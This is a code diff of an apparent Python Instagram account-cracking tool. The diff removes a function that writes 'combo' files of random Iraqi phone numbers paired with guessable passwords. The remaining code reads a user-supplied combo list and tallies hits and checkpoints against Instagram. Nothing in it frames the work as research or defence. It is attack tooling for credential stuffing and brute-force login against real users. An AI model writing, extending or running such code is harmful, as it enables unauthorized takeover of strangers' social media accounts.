@@ -1,79 +1,5 @@
 import os,sys,random
 ######################################
-def ins():
-	import json, requests, user_agent,os ,sys, time, datetime
-	import requests
-	from user_agent import generate_user_agent
-	from datetime import datetime
-	r = requests.session()
-	iiiii=input(" halbzhera: ")
-	def io():
-		combo="combo.txt"
-		pass
-	def i():
-		combo=input(" [PATH] File >>> ")
-		pass
-	def ii():
-		os.system("rm -rf combo.txt")
-		for lowdl in range(5000):
-			r=random.randint(1000000, 9999999)
-			rr=random.randint(1000000, 9999999)
-			sys.stdout=open("combo.txt", "a")
-			print("+964770"+str(r)+":"+str(r))
-			print("+964750"+str(rr)+":"+str(rr))
-			sys.stdout.flush()
-		print("     Combo ka drwst bw eakam hallbzhera w bnwsa combo.txt")
-		os.sys.exit()
-	def iii():
-		os.system("rm -rf combo.txt")
-		for loldl in range(5000):
-			r=random.randint(1000000, 9999999)
-			rr=random.randint(1000000, 9999999)
-			sys.stdout=open("combo.txt", "a")
-			print("+964770"+str(r)+":0770"+str(r))
-			print("+964750"+str(rr)+":0750"+str(rr))
-			sys.stdout.flush()
-		print("     Combo ka drwst bw eakam hallbzhera w bnwsa combo.txt")
-		os.sys.exit()
-	def iiii():
-		os.system("rm -rf combo.txt")
-		for lossll in range(1000):
-			r=random.randint(1000000, 9999999)
-			rr=random.randint(1000000, 9999999)
-			rrr=random.randint(1000000, 9999999)
-			rrrr=random.randint(1000000, 9999999)
-			rrrrr=random.randint(1000000, 9999999)
-			rrrrrr=random.randint(1000000, 9999999)
-			rrs=random.randint(1000000, 9999999)
-			sys.stdout=open("combo.txt", "a")
-			print("+964770"+str(r)+":"+str(r))
-			print("+964750"+str(rrs)+":"+str(rr))
-			print("+964750"+str(rr)+":0750"+str(rrs))
-			print("+964770"+str(rrr)+":0770"+str(rrr))
-			print("+964750"+str(rrrr)+":1234512345")
-			print("+964750"+str(rrrrr)+":123456123456")
-			print("+964750"+str(rrrrrr)+":1122334455")
-			sys.stdout.flush()
-		print("     Combo ka drwst bw eakam hallbzhera w bnwsa combo.txt")
-		os.sys.exit()
-	if iiiii=="1":
-		instagram1()
-	elif iiiii=="2":
-		ii()
-		io()
-		instagram1()
-	elif iiiii=="3":
-		iii()
-		io()
-		instagram1()
-	elif iiiii=="4":
-		iiii()
-		io()
-		instagram1()
-	elif iiiii=="0":
-		os.sys.exit()
-	else:
-		instagram1()
 
 #############################
 try:
@@ -226,7 +152,7 @@ def instagram1():
 	print(wd+'    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
 	def loopPp():
 		try:
-			combo="combo.txt"
+			combo=input("     [PATH] File >>> ")
 			file = open(combo,'r').read().splitlines()
 			global bad, timeout, checkpoint, error, hits
 			for line in file:
@@ -333,7 +259,7 @@ def dwbara():
     print(logo)
     i="1"
     if i=="1":
-        ins()
+        instagram1()
     elif i=="0":
         print(" Exit !")
         os.sys.exit()
